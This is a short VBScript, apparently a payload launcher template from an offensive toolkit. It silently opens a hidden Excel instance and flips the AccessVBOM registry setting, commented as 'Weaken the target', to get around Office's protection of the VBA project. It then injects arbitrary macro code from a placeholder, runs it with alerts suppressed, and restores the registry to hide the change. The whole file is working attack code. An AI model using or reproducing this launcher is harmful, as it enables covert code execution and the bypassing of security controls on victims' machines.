Dim objExcel, WshShell, RegPath, action, objWorkbook, xlmodule
Set objExcel = CreateObject("Excel.Application")
objExcel.Visible = False
Set WshShell = CreateObject("Wscript.Shell")
function RegExists(regKey)
	on error resume next
	WshShell.RegRead regKey
	RegExists = (Err.number = 0)
end function
' Get the old AccessVBOM value
RegPath = "HKEY_CURRENT_USER\Software\Microsoft\Office\" & objExcel.Version & "\Excel\Security\AccessVBOM"
if RegExists(RegPath) then
	action = WshShell.RegRead(RegPath)
else
	action = ""
end if
' Weaken the target
WshShell.RegWrite RegPath, 1, "REG_DWORD"
' Run the macro
Set objWorkbook = objExcel.Workbooks.Add()
Set xlmodule = objWorkbook.VBProject.VBComponents.Add(1)
xlmodule.CodeModule.AddFromString $$CODE$$
objExcel.DisplayAlerts = False
on error resume next
objExcel.Run "Auto_Open"
objWorkbook.Close False
objExcel.Quit
' Restore the registry to its old state
if action = "" then
	WshShell.RegDelete RegPath
else
	WshShell.RegWrite RegPath, action, "REG_DWORD"
end if
